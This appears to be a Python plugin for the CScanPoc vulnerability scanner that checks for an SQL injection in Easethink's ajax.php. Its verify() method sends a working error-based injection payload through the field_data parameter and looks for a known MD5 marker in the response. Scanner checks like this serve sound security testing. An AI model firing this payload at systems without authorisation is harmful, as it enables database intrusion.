# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Easethink_0001_p'  # 平台漏洞编号，留空
    name = '易想团购ajax.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-04-16'  # 漏洞公布时间
    desc = '''
        在注册的时候，输入用户名后台会验证用户名是否存在，当然是通过ajax去验证的也就是ajax.php。很多程序多会忽略这个导致存在SQL注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/534/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Easethink(易想团购管理系统)'  # 漏洞应用名称
    product_version = 'Easethink_free_v1.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '900bff3b-9e19-451f-9f1e-c1c92493be53'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 根据实际安装情况确定payload
            payload = '/easethink_free_v1.4/ajax.php'
            data = "?act=check_field&field_name=user_name&field_data='and/**/(select/**/1/**/from/**/(select/**/count(*),concat(md5(c),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)%23"
            url = self.target + payload + data
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
